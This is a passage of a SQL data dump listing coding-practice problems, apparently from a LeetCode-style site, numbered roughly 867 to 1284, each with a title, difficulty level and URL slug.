Matrix','Easy','transpose-matrix',1),(868,'Binary Gap','Easy','binary-gap',1),(869,'Reordered Power of 2','Medium','reordered-power-of-2',1),(870,'Advantage Shuffle','Medium','advantage-shuffle',1),(871,'Minimum Number of Refueling Stops','Hard','minimum-number-of-refueling-stops',1),(872,'Leaf-Similar Trees','Easy','leaf-similar-trees',1),(873,'Length of Longest Fibonacci Subsequence','Medium','length-of-longest-fibonacci-subsequence',1),(874,'Walking Robot Simulation','Medium','walking-robot-simulation',1),(875,'Koko Eating Bananas','Medium','koko-eating-bananas',1),(876,'Middle of the Linked List','Easy','middle-of-the-linked-list',1),(877,'Stone Game','Medium','stone-game',1),(878,'Nth Magical Number','Hard','nth-magical-number',1),(879,'Profitable Schemes','Hard','profitable-schemes',1),(880,'Decoded String at Index','Medium','decoded-string-at-index',1),(881,'Boats to Save People','Medium','boats-to-save-people',1),(882,'Reachable Nodes In Subdivided Graph','Hard','reachable-nodes-in-subdivided-graph',1),(883,'Projection Area of 3D Shapes','Easy','projection-area-of-3d-shapes',1),(884,'Uncommon Words from Two Sentences','Easy','uncommon-words-from-two-sentences',1),(885,'Spiral Matrix III','Medium','spiral-matrix-iii',1),(886,'Possible Bipartition','Medium','possible-bipartition',1),(887,'Super Egg Drop','Hard','super-egg-drop',1),(888,'Fair Candy Swap','Easy','fair-candy-swap',1),(889,'Construct Binary Tree from Preorder and Postorder Traversal','Medium','construct-binary-tree-from-preorder-and-postorder-traversal',1),(890,'Find and Replace Pattern','Medium','find-and-replace-pattern',1),(891,'Sum of Subsequence Widths','Hard','sum-of-subsequence-widths',1),(892,'Surface Area of 3D Shapes','Easy','surface-area-of-3d-shapes',1),(893,'Groups of Special-Equivalent Strings','Medium','groups-of-special-equivalent-strings',1),(894,'All Possible Full Binary Trees','Medium','all-possible-full-binary-trees',1),(895,'Maximum Frequency Stack','Hard','maximum-frequency-stack',1),(896,'Monotonic Array','Easy','monotonic-array',1),(897,'Increasing Order Search Tree','Easy','increasing-order-search-tree',1),(898,'Bitwise ORs of Subarrays','Medium','bitwise-ors-of-subarrays',1),(899,'Orderly Queue','Hard','orderly-queue',1),(900,'RLE Iterator','Medium','rle-iterator',1),(901,'Online Stock Span','Medium','online-stock-span',1),(902,'Numbers At Most N Given Digit Set','Hard','numbers-at-most-n-given-digit-set',1),(903,'Valid Permutations for DI Sequence','Hard','valid-permutations-for-di-sequence',1),(904,'Fruit Into Baskets','Medium','fruit-into-baskets',1),(905,'Sort Array By Parity','Easy','sort-array-by-parity',1),(906,'Super Palindromes','Hard','super-palindromes',1),(907,'Sum of Subarray Minimums','Medium','sum-of-subarray-minimums',1),(908,'Smallest Range I','Easy','smallest-range-i',1),(909,'Snakes and Ladders','Medium','snakes-and-ladders',1),(910,'Smallest Range II','Medium','smallest-range-ii',1),(911,'Online Election','Medium','online-election',1),(912,'Sort an Array','Medium','sort-an-array',1),(913,'Cat and Mouse','Hard','cat-and-mouse',1),(914,'X of a Kind in a Deck of Cards','Easy','x-of-a-kind-in-a-deck-of-cards',1),(915,'Partition Array into Disjoint Intervals','Medium','partition-array-into-disjoint-intervals',1),(916,'Word Subsets','Medium','word-subsets',1),(917,'Reverse Only Letters','Easy','reverse-only-letters',1),(918,'Maximum Sum Circular Subarray','Medium','maximum-sum-circular-subarray',1),(919,'Complete Binary Tree Inserter','Medium','complete-binary-tree-inserter',1),(920,'Number of Music Playlists','Hard','number-of-music-playlists',1),(921,'Minimum Add to Make Parentheses Valid','Medium','minimum-add-to-make-parentheses-valid',1),(922,'Sort Array By Parity II','Easy','sort-array-by-parity-ii',1),(923,'3Sum With Multiplicity','Medium','3sum-with-multiplicity',1),(924,'Minimize Malware Spread','Hard','minimize-malware-spread',1),(925,'Long Pressed Name','Easy','long-pressed-name',1),(926,'Flip String to Monotone Increasing','Medium','flip-string-to-monotone-increasing',1),(927,'Three Equal Parts','Hard','three-equal-parts',1),(928,'Minimize Malware Spread II','Hard','minimize-malware-spread-ii',1),(929,'Unique Email Addresses','Easy','unique-email-addresses',1),(930,'Binary Subarrays With Sum','Medium','binary-subarrays-with-sum',1),(931,'Minimum Falling Path Sum','Medium','minimum-falling-path-sum',1),(932,'Beautiful Array','Medium','beautiful-array',1),(933,'Number of Recent Calls','Easy','number-of-recent-calls',1),(934,'Shortest Bridge','Medium','shortest-bridge',1),(935,'Knight Dialer','Medium','knight-dialer',1),(936,'Stamping The Sequence','Hard','stamping-the-sequence',1),(937,'Reorder Data in Log Files','Medium','reorder-data-in-log-files',1),(938,'Range Sum of BST','Easy','range-sum-of-bst',1),(939,'Minimum Area Rectangle','Medium','minimum-area-rectangle',1),(940,'Distinct Subsequences II','Hard','distinct-subsequences-ii',1),(941,'Valid Mountain Array','Easy','valid-mountain-array',1),(942,'DI String Match','Easy','di-string-match',1),(943,'Find the Shortest Superstring','Hard','find-the-shortest-superstring',1),(944,'Delete Columns to Make Sorted','Easy','delete-columns-to-make-sorted',1),(945,'Minimum Increment to Make Array Unique','Medium','minimum-increment-to-make-array-unique',1),(946,'Validate Stack Sequences','Medium','validate-stack-sequences',1),(947,'Most Stones Removed with Same Row or Column','Medium','most-stones-removed-with-same-row-or-column',1),(948,'Bag of Tokens','Medium','bag-of-tokens',1),(949,'Largest Time for Given Digits','Medium','largest-time-for-given-digits',1),(950,'Reveal Cards In Increasing Order','Medium','reveal-cards-in-increasing-order',1),(951,'Flip Equivalent Binary Trees','Medium','flip-equivalent-binary-trees',1),(952,'Largest Component Size by Common Factor','Hard','largest-component-size-by-common-factor',1),(953,'Verifying an Alien Dictionary','Easy','verifying-an-alien-dictionary',1),(954,'Array of Doubled Pairs','Medium','array-of-doubled-pairs',1),(955,'Delete Columns to Make Sorted II','Medium','delete-columns-to-make-sorted-ii',1),(956,'Tallest Billboard','Hard','tallest-billboard',1),(957,'Prison Cells After N Days','Medium','prison-cells-after-n-days',1),(958,'Check Completeness of a Binary Tree','Medium','check-completeness-of-a-binary-tree',1),(959,'Regions Cut By Slashes','Medium','regions-cut-by-slashes',1),(960,'Delete Columns to Make Sorted III','Hard','delete-columns-to-make-sorted-iii',1),(961,'N-Repeated Element in Size 2N Array','Easy','n-repeated-element-in-size-2n-array',1),(962,'Maximum Width Ramp','Medium','maximum-width-ramp',1),(963,'Minimum Area Rectangle II','Medium','minimum-area-rectangle-ii',1),(964,'Least Operators to Express Number','Hard','least-operators-to-express-number',1),(965,'Univalued Binary Tree','Easy','univalued-binary-tree',1),(966,'Vowel Spellchecker','Medium','vowel-spellchecker',1),(967,'Numbers With Same Consecutive Differences','Medium','numbers-with-same-consecutive-differences',1),(968,'Binary Tree Cameras','Hard','binary-tree-cameras',1),(969,'Pancake Sorting','Medium','pancake-sorting',1),(970,'Powerful Integers','Medium','powerful-integers',1),(971,'Flip Binary Tree To Match Preorder Traversal','Medium','flip-binary-tree-to-match-preorder-traversal',1),(972,'Equal Rational Numbers','Hard','equal-rational-numbers',1),(973,'K Closest Points to Origin','Medium','k-closest-points-to-origin',1),(974,'Subarray Sums Divisible by K','Medium','subarray-sums-divisible-by-k',1),(975,'Odd Even Jump','Hard','odd-even-jump',1),(976,'Largest Perimeter Triangle','Easy','largest-perimeter-triangle',1),(977,'Squares of a Sorted Array','Easy','squares-of-a-sorted-array',1),(978,'Longest Turbulent Subarray','Medium','longest-turbulent-subarray',1),(979,'Distribute Coins in Binary Tree','Medium','distribute-coins-in-binary-tree',1),(980,'Unique Paths III','Hard','unique-paths-iii',1),(981,'Time Based Key-Value Store','Medium','time-based-key-value-store',1),(982,'Triples with Bitwise AND Equal To Zero','Hard','triples-with-bitwise-and-equal-to-zero',1),(983,'Minimum Cost For Tickets','Medium','minimum-cost-for-tickets',1),(984,'String Without AAA or BBB','Medium','string-without-aaa-or-bbb',1),(985,'Sum of Even Numbers After Queries','Medium','sum-of-even-numbers-after-queries',1),(986,'Interval List Intersections','Medium','interval-list-intersections',1),(987,'Vertical Order Traversal of a Binary Tree','Hard','vertical-order-traversal-of-a-binary-tree',1),(988,'Smallest String Starting From Leaf','Medium','smallest-string-starting-from-leaf',1),(989,'Add to Array-Form of Integer','Easy','add-to-array-form-of-integer',1),(990,'Satisfiability of Equality Equations','Medium','satisfiability-of-equality-equations',1),(991,'Broken Calculator','Medium','broken-calculator',1),(992,'Subarrays with K Different Integers','Hard','subarrays-with-k-different-integers',1),(993,'Cousins in Binary Tree','Easy','cousins-in-binary-tree',1),(994,'Rotting Oranges','Medium','rotting-oranges',1),(995,'Minimum Number of K Consecutive Bit Flips','Hard','minimum-number-of-k-consecutive-bit-flips',1),(996,'Number of Squareful Arrays','Hard','number-of-squareful-arrays',1),(997,'Find the Town Judge','Easy','find-the-town-judge',1),(998,'Maximum Binary Tree II','Medium','maximum-binary-tree-ii',1),(999,'Available Captures for Rook','Easy','available-captures-for-rook',1),(1000,'Minimum Cost to Merge Stones','Hard','minimum-cost-to-merge-stones',1),(1001,'Grid Illumination','Hard','grid-illumination',1),(1002,'Find Common Characters','Easy','find-common-characters',1),(1003,'Check If Word Is Valid After Substitutions','Medium','check-if-word-is-valid-after-substitutions',1),(1004,'Max Consecutive Ones III','Medium','max-consecutive-ones-iii',1),(1005,'Maximize Sum Of Array After K Negations','Easy','maximize-sum-of-array-after-k-negations',1),(1006,'Clumsy Factorial','Medium','clumsy-factorial',1),(1007,'Minimum Domino Rotations For Equal Row','Medium','minimum-domino-rotations-for-equal-row',1),(1008,'Construct Binary Search Tree from Preorder Traversal','Medium','construct-binary-search-tree-from-preorder-traversal',1),(1009,'Complement of Base 10 Integer','Easy','complement-of-base-10-integer',1),(1010,'Pairs of Songs With Total Durations Divisible by 60','Medium','pairs-of-songs-with-total-durations-divisible-by-60',1),(1011,'Capacity To Ship Packages Within D Days','Medium','capacity-to-ship-packages-within-d-days',1),(1012,'Numbers With Repeated Digits','Hard','numbers-with-repeated-digits',1),(1013,'Partition Array Into Three Parts With Equal Sum','Easy','partition-array-into-three-parts-with-equal-sum',1),(1014,'Best Sightseeing Pair','Medium','best-sightseeing-pair',1),(1015,'Smallest Integer Divisible by K','Medium','smallest-integer-divisible-by-k',1),(1016,'Binary String With Substrings Representing 1 To N','Medium','binary-string-with-substrings-representing-1-to-n',1),(1017,'Convert to Base -2','Medium','convert-to-base-2',1),(1018,'Binary Prefix Divisible By 5','Easy','binary-prefix-divisible-by-5',1),(1019,'Next Greater Node In Linked List','Medium','next-greater-node-in-linked-list',1),(1020,'Number of Enclaves','Medium','number-of-enclaves',1),(1021,'Remove Outermost Parentheses','Easy','remove-outermost-parentheses',1),(1022,'Sum of Root To Leaf Binary Numbers','Easy','sum-of-root-to-leaf-binary-numbers',1),(1023,'Camelcase Matching','Medium','camelcase-matching',1),(1024,'Video Stitching','Medium','video-stitching',1),(1025,'Divisor Game','Easy','divisor-game',1),(1026,'Maximum Difference Between Node and Ancestor','Medium','maximum-difference-between-node-and-ancestor',1),(1027,'Longest Arithmetic Subsequence','Medium','longest-arithmetic-subsequence',1),(1028,'Recover a Tree From Preorder Traversal','Hard','recover-a-tree-from-preorder-traversal',1),(1029,'Two City Scheduling','Medium','two-city-scheduling',1),(1030,'Matrix Cells in Distance Order','Easy','matrix-cells-in-distance-order',1),(1031,'Maximum Sum of Two Non-Overlapping Subarrays','Medium','maximum-sum-of-two-non-overlapping-subarrays',1),(1032,'Stream of Characters','Hard','stream-of-characters',1),(1033,'Moving Stones Until Consecutive','Medium','moving-stones-until-consecutive',1),(1034,'Coloring A Border','Medium','coloring-a-border',1),(1035,'Uncrossed Lines','Medium','uncrossed-lines',1),(1036,'Escape a Large Maze','Hard','escape-a-large-maze',1),(1037,'Valid Boomerang','Easy','valid-boomerang',1),(1038,'Binary Search Tree to Greater Sum Tree','Medium','binary-search-tree-to-greater-sum-tree',1),(1039,'Minimum Score Triangulation of Polygon','Medium','minimum-score-triangulation-of-polygon',1),(1040,'Moving Stones Until Consecutive II','Medium','moving-stones-until-consecutive-ii',1),(1041,'Robot Bounded In Circle','Medium','robot-bounded-in-circle',1),(1042,'Flower Planting With No Adjacent','Medium','flower-planting-with-no-adjacent',1),(1043,'Partition Array for Maximum Sum','Medium','partition-array-for-maximum-sum',1),(1044,'Longest Duplicate Substring','Hard','longest-duplicate-substring',1),(1045,'Customers Who Bought All Products','Medium','customers-who-bought-all-products',1),(1046,'Last Stone Weight','Easy','last-stone-weight',1),(1047,'Remove All Adjacent Duplicates In String','Easy','remove-all-adjacent-duplicates-in-string',1),(1048,'Longest String Chain','Medium','longest-string-chain',1),(1049,'Last Stone Weight II','Medium','last-stone-weight-ii',1),(1050,'Actors and Directors Who Cooperated At Least Three Times','Easy','actors-and-directors-who-cooperated-at-least-three-times',1),(1051,'Height Checker','Easy','height-checker',1),(1052,'Grumpy Bookstore Owner','Medium','grumpy-bookstore-owner',1),(1053,'Previous Permutation With One Swap','Medium','previous-permutation-with-one-swap',1),(1054,'Distant Barcodes','Medium','distant-barcodes',1),(1055,'Shortest Way to Form String','Medium','shortest-way-to-form-string',1),(1056,'Confusing Number','Easy','confusing-number',1),(1057,'Campus Bikes','Medium','campus-bikes',1),(1058,'Minimize Rounding Error to Meet Target','Medium','minimize-rounding-error-to-meet-target',1),(1059,'All Paths from Source Lead to Destination','Medium','all-paths-from-source-lead-to-destination',1),(1060,'Missing Element in Sorted Array','Medium','missing-element-in-sorted-array',1),(1061,'Lexicographically Smallest Equivalent String','Medium','lexicographically-smallest-equivalent-string',1),(1062,'Longest Repeating Substring','Medium','longest-repeating-substring',1),(1063,'Number of Valid Subarrays','Hard','number-of-valid-subarrays',1),(1064,'Fixed Point','Easy','fixed-point',1),(1065,'Index Pairs of a String','Easy','index-pairs-of-a-string',1),(1066,'Campus Bikes II','Medium','campus-bikes-ii',1),(1067,'Digit Count in Range','Hard','digit-count-in-range',1),(1068,'Product Sales Analysis I','Easy','product-sales-analysis-i',1),(1069,'Product Sales Analysis II','Easy','product-sales-analysis-ii',1),(1070,'Product Sales Analysis III','Medium','product-sales-analysis-iii',1),(1071,'Greatest Common Divisor of Strings','Easy','greatest-common-divisor-of-strings',1),(1072,'Flip Columns For Maximum Number of Equal Rows','Medium','flip-columns-for-maximum-number-of-equal-rows',1),(1073,'Adding Two Negabinary Numbers','Medium','adding-two-negabinary-numbers',1),(1074,'Number of Submatrices That Sum to Target','Hard','number-of-submatrices-that-sum-to-target',1),(1075,'Project Employees I','Easy','project-employees-i',1),(1076,'Project Employees II','Easy','project-employees-ii',1),(1077,'Project Employees III','Medium','project-employees-iii',1),(1078,'Occurrences After Bigram','Easy','occurrences-after-bigram',1),(1079,'Letter Tile Possibilities','Medium','letter-tile-possibilities',1),(1080,'Insufficient Nodes in Root to Leaf Paths','Medium','insufficient-nodes-in-root-to-leaf-paths',1),(1081,'Smallest Subsequence of Distinct Characters','Medium','smallest-subsequence-of-distinct-characters',1),(1082,'Sales Analysis I','Easy','sales-analysis-i',1),(1083,'Sales Analysis II','Easy','sales-analysis-ii',1),(1084,'Sales Analysis III','Easy','sales-analysis-iii',1),(1085,'Sum of Digits in the Minimum Number','Easy','sum-of-digits-in-the-minimum-number',1),(1086,'High Five','Easy','high-five',1),(1087,'Brace Expansion','Medium','brace-expansion',1),(1088,'Confusing Number II','Hard','confusing-number-ii',1),(1089,'Duplicate Zeros','Easy','duplicate-zeros',1),(1090,'Largest Values From Labels','Medium','largest-values-from-labels',1),(1091,'Shortest Path in Binary Matrix','Medium','shortest-path-in-binary-matrix',1),(1092,'Shortest Common Supersequence ','Hard','shortest-common-supersequence',1),(1093,'Statistics from a Large Sample','Medium','statistics-from-a-large-sample',1),(1094,'Car Pooling','Medium','car-pooling',1),(1095,'Find in Mountain Array','Hard','find-in-mountain-array',1),(1096,'Brace Expansion II','Hard','brace-expansion-ii',1),(1097,'Game Play Analysis V','Hard','game-play-analysis-v',1),(1098,'Unpopular Books','Medium','unpopular-books',1),(1099,'Two Sum Less Than K','Easy','two-sum-less-than-k',1),(1100,'Find K-Length Substrings With No Repeated Characters','Medium','find-k-length-substrings-with-no-repeated-characters',1),(1101,'The Earliest Moment When Everyone Become Friends','Medium','the-earliest-moment-when-everyone-become-friends',1),(1102,'Path With Maximum Minimum Value','Medium','path-with-maximum-minimum-value',1),(1103,'Distribute Candies to People','Easy','distribute-candies-to-people',1),(1104,'Path In Zigzag Labelled Binary Tree','Medium','path-in-zigzag-labelled-binary-tree',1),(1105,'Filling Bookcase Shelves','Medium','filling-bookcase-shelves',1),(1106,'Parsing A Boolean Expression','Hard','parsing-a-boolean-expression',1),(1107,'New Users Daily Count','Medium','new-users-daily-count',1),(1108,'Defanging an IP Address','Easy','defanging-an-ip-address',1),(1109,'Corporate Flight Bookings','Medium','corporate-flight-bookings',1),(1110,'Delete Nodes And Return Forest','Medium','delete-nodes-and-return-forest',1),(1111,'Maximum Nesting Depth of Two Valid Parentheses Strings','Medium','maximum-nesting-depth-of-two-valid-parentheses-strings',1),(1112,'Highest Grade For Each Student','Medium','highest-grade-for-each-student',1),(1113,'Reported Posts','Easy','reported-posts',1),(1114,'Print in Order','Easy','print-in-order',1),(1115,'Print FooBar Alternately','Medium','print-foobar-alternately',1),(1116,'Print Zero Even Odd','Medium','print-zero-even-odd',1),(1117,'Building H2O','Medium','building-h2o',1),(1118,'Number of Days in a Month','Easy','number-of-days-in-a-month',1),(1119,'Remove Vowels from a String','Easy','remove-vowels-from-a-string',1),(1120,'Maximum Average Subtree','Medium','maximum-average-subtree',1),(1121,'Divide Array Into Increasing Sequences','Hard','divide-array-into-increasing-sequences',1),(1122,'Relative Sort Array','Easy','relative-sort-array',1),(1123,'Lowest Common Ancestor of Deepest Leaves','Medium','lowest-common-ancestor-of-deepest-leaves',1),(1124,'Longest Well-Performing Interval','Medium','longest-well-performing-interval',1),(1125,'Smallest Sufficient Team','Hard','smallest-sufficient-team',1),(1126,'Active Businesses','Medium','active-businesses',1),(1127,'User Purchase Platform','Hard','user-purchase-platform',1),(1128,'Number of Equivalent Domino Pairs','Easy','number-of-equivalent-domino-pairs',1),(1129,'Shortest Path with Alternating Colors','Medium','shortest-path-with-alternating-colors',1),(1130,'Minimum Cost Tree From Leaf Values','Medium','minimum-cost-tree-from-leaf-values',1),(1131,'Maximum of Absolute Value Expression','Medium','maximum-of-absolute-value-expression',1),(1132,'Reported Posts II','Medium','reported-posts-ii',1),(1133,'Largest Unique Number','Easy','largest-unique-number',1),(1134,'Armstrong Number','Easy','armstrong-number',1),(1135,'Connecting Cities With Minimum Cost','Medium','connecting-cities-with-minimum-cost',1),(1136,'Parallel Courses','Medium','parallel-courses',1),(1137,'N-th Tribonacci Number','Easy','n-th-tribonacci-number',1),(1138,'Alphabet Board Path','Medium','alphabet-board-path',1),(1139,'Largest 1-Bordered Square','Medium','largest-1-bordered-square',1),(1140,'Stone Game II','Medium','stone-game-ii',1),(1141,'User Activity for the Past 30 Days I','Easy','user-activity-for-the-past-30-days-i',1),(1142,'User Activity for the Past 30 Days II','Easy','user-activity-for-the-past-30-days-ii',1),(1143,'Longest Common Subsequence','Medium','longest-common-subsequence',1),(1144,'Decrease Elements To Make Array Zigzag','Medium','decrease-elements-to-make-array-zigzag',1),(1145,'Binary Tree Coloring Game','Medium','binary-tree-coloring-game',1),(1146,'Snapshot Array','Medium','snapshot-array',1),(1147,'Longest Chunked Palindrome Decomposition','Hard','longest-chunked-palindrome-decomposition',1),(1148,'Article Views I','Easy','article-views-i',1),(1149,'Article Views II','Medium','article-views-ii',1),(1150,'Check If a Number Is Majority Element in a Sorted Array','Easy','check-if-a-number-is-majority-element-in-a-sorted-array',1),(1151,'Minimum Swaps to Group All 1\'s Together','Medium','minimum-swaps-to-group-all-1s-together',1),(1152,'Analyze User Website Visit Pattern','Medium','analyze-user-website-visit-pattern',1),(1153,'String Transforms Into Another String','Hard','string-transforms-into-another-string',1),(1154,'Day of the Year','Easy','day-of-the-year',1),(1155,'Number of Dice Rolls With Target Sum','Medium','number-of-dice-rolls-with-target-sum',1),(1156,'Swap For Longest Repeated Character Substring','Medium','swap-for-longest-repeated-character-substring',1),(1157,'Online Majority Element In Subarray','Hard','online-majority-element-in-subarray',1),(1158,'Market Analysis I','Medium','market-analysis-i',1),(1159,'Market Analysis II','Hard','market-analysis-ii',1),(1160,'Find Words That Can Be Formed by Characters','Easy','find-words-that-can-be-formed-by-characters',1),(1161,'Maximum Level Sum of a Binary Tree','Medium','maximum-level-sum-of-a-binary-tree',1),(1162,'As Far from Land as Possible','Medium','as-far-from-land-as-possible',1),(1163,'Last Substring in Lexicographical Order','Hard','last-substring-in-lexicographical-order',1),(1164,'Product Price at a Given Date','Medium','product-price-at-a-given-date',1),(1165,'Single-Row Keyboard','Easy','single-row-keyboard',1),(1166,'Design File System','Medium','design-file-system',1),(1167,'Minimum Cost to Connect Sticks','Medium','minimum-cost-to-connect-sticks',1),(1168,'Optimize Water Distribution in a Village','Hard','optimize-water-distribution-in-a-village',1),(1169,'Invalid Transactions','Medium','invalid-transactions',1),(1170,'Compare Strings by Frequency of the Smallest Character','Medium','compare-strings-by-frequency-of-the-smallest-character',1),(1171,'Remove Zero Sum Consecutive Nodes from Linked List','Medium','remove-zero-sum-consecutive-nodes-from-linked-list',1),(1172,'Dinner Plate Stacks','Hard','dinner-plate-stacks',1),(1173,'Immediate Food Delivery I','Easy','immediate-food-delivery-i',1),(1174,'Immediate Food Delivery II','Medium','immediate-food-delivery-ii',1),(1175,'Prime Arrangements','Easy','prime-arrangements',1),(1176,'Diet Plan Performance','Easy','diet-plan-performance',1),(1177,'Can Make Palindrome from Substring','Medium','can-make-palindrome-from-substring',1),(1178,'Number of Valid Words for Each Puzzle','Hard','number-of-valid-words-for-each-puzzle',1),(1179,'Reformat Department Table','Easy','reformat-department-table',1),(1180,'Count Substrings with Only One Distinct Letter','Easy','count-substrings-with-only-one-distinct-letter',1),(1181,'Before and After Puzzle','Medium','before-and-after-puzzle',1),(1182,'Shortest Distance to Target Color','Medium','shortest-distance-to-target-color',1),(1183,'Maximum Number of Ones','Hard','maximum-number-of-ones',1),(1184,'Distance Between Bus Stops','Easy','distance-between-bus-stops',1),(1185,'Day of the Week','Easy','day-of-the-week',1),(1186,'Maximum Subarray Sum with One Deletion','Medium','maximum-subarray-sum-with-one-deletion',1),(1187,'Make Array Strictly Increasing','Hard','make-array-strictly-increasing',1),(1188,'Design Bounded Blocking Queue','Medium','design-bounded-blocking-queue',1),(1189,'Maximum Number of Balloons','Easy','maximum-number-of-balloons',1),(1190,'Reverse Substrings Between Each Pair of Parentheses','Medium','reverse-substrings-between-each-pair-of-parentheses',1),(1191,'K-Concatenation Maximum Sum','Medium','k-concatenation-maximum-sum',1),(1192,'Critical Connections in a Network','Hard','critical-connections-in-a-network',1),(1193,'Monthly Transactions I','Medium','monthly-transactions-i',1),(1194,'Tournament Winners','Hard','tournament-winners',1),(1195,'Fizz Buzz Multithreaded','Medium','fizz-buzz-multithreaded',1),(1196,'How Many Apples Can You Put into the Basket','Easy','how-many-apples-can-you-put-into-the-basket',1),(1197,'Minimum Knight Moves','Medium','minimum-knight-moves',1),(1198,'Find Smallest Common Element in All Rows','Medium','find-smallest-common-element-in-all-rows',1),(1199,'Minimum Time to Build Blocks','Hard','minimum-time-to-build-blocks',1),(1200,'Minimum Absolute Difference','Easy','minimum-absolute-difference',1),(1201,'Ugly Number III','Medium','ugly-number-iii',1),(1202,'Smallest String With Swaps','Medium','smallest-string-with-swaps',1),(1203,'Sort Items by Groups Respecting Dependencies','Hard','sort-items-by-groups-respecting-dependencies',1),(1204,'Last Person to Fit in the Bus','Medium','last-person-to-fit-in-the-bus',1),(1205,'Monthly Transactions II','Medium','monthly-transactions-ii',1),(1206,'Design Skiplist','Hard','design-skiplist',1),(1207,'Unique Number of Occurrences','Easy','unique-number-of-occurrences',1),(1208,'Get Equal Substrings Within Budget','Medium','get-equal-substrings-within-budget',1),(1209,'Remove All Adjacent Duplicates in String II','Medium','remove-all-adjacent-duplicates-in-string-ii',1),(1210,'Minimum Moves to Reach Target with Rotations','Hard','minimum-moves-to-reach-target-with-rotations',1),(1211,'Queries Quality and Percentage','Easy','queries-quality-and-percentage',1),(1212,'Team Scores in Football Tournament','Medium','team-scores-in-football-tournament',1),(1213,'Intersection of Three Sorted Arrays','Easy','intersection-of-three-sorted-arrays',1),(1214,'Two Sum BSTs','Medium','two-sum-bsts',1),(1215,'Stepping Numbers','Medium','stepping-numbers',1),(1216,'Valid Palindrome III','Hard','valid-palindrome-iii',1),(1217,'Minimum Cost to Move Chips to The Same Position','Easy','minimum-cost-to-move-chips-to-the-same-position',1),(1218,'Longest Arithmetic Subsequence of Given Difference','Medium','longest-arithmetic-subsequence-of-given-difference',1),(1219,'Path with Maximum Gold','Medium','path-with-maximum-gold',1),(1220,'Count Vowels Permutation','Hard','count-vowels-permutation',1),(1221,'Split a String in Balanced Strings','Easy','split-a-string-in-balanced-strings',1),(1222,'Queens That Can Attack the King','Medium','queens-that-can-attack-the-king',1),(1223,'Dice Roll Simulation','Hard','dice-roll-simulation',1),(1224,'Maximum Equal Frequency','Hard','maximum-equal-frequency',1),(1225,'Report Contiguous Dates','Hard','report-contiguous-dates',1),(1226,'The Dining Philosophers','Medium','the-dining-philosophers',1),(1227,'Airplane Seat Assignment Probability','Medium','airplane-seat-assignment-probability',1),(1228,'Missing Number In Arithmetic Progression','Easy','missing-number-in-arithmetic-progression',1),(1229,'Meeting Scheduler','Medium','meeting-scheduler',1),(1230,'Toss Strange Coins','Medium','toss-strange-coins',1),(1231,'Divide Chocolate','Hard','divide-chocolate',1),(1232,'Check If It Is a Straight Line','Easy','check-if-it-is-a-straight-line',1),(1233,'Remove Sub-Folders from the Filesystem','Medium','remove-sub-folders-from-the-filesystem',1),(1234,'Replace the Substring for Balanced String','Medium','replace-the-substring-for-balanced-string',1),(1235,'Maximum Profit in Job Scheduling','Hard','maximum-profit-in-job-scheduling',1),(1236,'Web Crawler','Medium','web-crawler',1),(1237,'Find Positive Integer Solution for a Given Equation','Medium','find-positive-integer-solution-for-a-given-equation',1),(1238,'Circular Permutation in Binary Representation','Medium','circular-permutation-in-binary-representation',1),(1239,'Maximum Length of a Concatenated String with Unique Characters','Medium','maximum-length-of-a-concatenated-string-with-unique-characters',1),(1240,'Tiling a Rectangle with the Fewest Squares','Hard','tiling-a-rectangle-with-the-fewest-squares',1),(1241,'Number of Comments per Post','Easy','number-of-comments-per-post',1),(1242,'Web Crawler Multithreaded','Medium','web-crawler-multithreaded',1),(1243,'Array Transformation','Easy','array-transformation',1),(1244,'Design A Leaderboard','Medium','design-a-leaderboard',1),(1245,'Tree Diameter','Medium','tree-diameter',1),(1246,'Palindrome Removal','Hard','palindrome-removal',1),(1247,'Minimum Swaps to Make Strings Equal','Medium','minimum-swaps-to-make-strings-equal',1),(1248,'Count Number of Nice Subarrays','Medium','count-number-of-nice-subarrays',1),(1249,'Minimum Remove to Make Valid Parentheses','Medium','minimum-remove-to-make-valid-parentheses',1),(1250,'Check If It Is a Good Array','Hard','check-if-it-is-a-good-array',1),(1251,'Average Selling Price','Easy','average-selling-price',1),(1252,'Cells with Odd Values in a Matrix','Easy','cells-with-odd-values-in-a-matrix',1),(1253,'Reconstruct a 2-Row Binary Matrix','Medium','reconstruct-a-2-row-binary-matrix',1),(1254,'Number of Closed Islands','Medium','number-of-closed-islands',1),(1255,'Maximum Score Words Formed by Letters','Hard','maximum-score-words-formed-by-letters',1),(1256,'Encode Number','Medium','encode-number',1),(1257,'Smallest Common Region','Medium','smallest-common-region',1),(1258,'Synonymous Sentences','Medium','synonymous-sentences',1),(1259,'Handshakes That Don\'t Cross','Hard','handshakes-that-dont-cross',1),(1260,'Shift 2D Grid','Easy','shift-2d-grid',1),(1261,'Find Elements in a Contaminated Binary Tree','Medium','find-elements-in-a-contaminated-binary-tree',1),(1262,'Greatest Sum Divisible by Three','Medium','greatest-sum-divisible-by-three',1),(1263,'Minimum Moves to Move a Box to Their Target Location','Hard','minimum-moves-to-move-a-box-to-their-target-location',1),(1264,'Page Recommendations','Medium','page-recommendations',1),(1265,'Print Immutable Linked List in Reverse','Medium','print-immutable-linked-list-in-reverse',1),(1266,'Minimum Time Visiting All Points','Easy','minimum-time-visiting-all-points',1),(1267,'Count Servers that Communicate','Medium','count-servers-that-communicate',1),(1268,'Search Suggestions System','Medium','search-suggestions-system',1),(1269,'Number of Ways to Stay in the Same Place After Some Steps','Hard','number-of-ways-to-stay-in-the-same-place-after-some-steps',1),(1270,'All People Report to the Given Manager','Medium','all-people-report-to-the-given-manager',1),(1271,'Hexspeak','Easy','hexspeak',1),(1272,'Remove Interval','Medium','remove-interval',1),(1273,'Delete Tree Nodes','Medium','delete-tree-nodes',1),(1274,'Number of Ships in a Rectangle','Hard','number-of-ships-in-a-rectangle',1),(1275,'Find Winner on a Tic Tac Toe Game','Easy','find-winner-on-a-tic-tac-toe-game',1),(1276,'Number of Burgers with No Waste of Ingredients','Medium','number-of-burgers-with-no-waste-of-ingredients',1),(1277,'Count Square Submatrices with All Ones','Medium','count-square-submatrices-with-all-ones',1),(1278,'Palindrome Partitioning III','Hard','palindrome-partitioning-iii',1),(1279,'Traffic Light Controlled Intersection','Easy','traffic-light-controlled-intersection',1),(1280,'Students and Examinations','Easy','students-and-examinations',1),(1281,'Subtract the Product and Sum of Digits of an Integer','Easy','subtract-the-product-and-sum-of-digits-of-an-integer',1),(1282,'Group the People Given the Group Size They Belong To','Medium','group-the-people-given-the-group-size-they-belong-to',1),(1283,'Find the Smallest Divisor Given a Threshold','Medium','find-the-smallest-divisor-given-a-threshold',1),(1284,'Minimum Number of Flips to Convert Binary Matrix to Zero 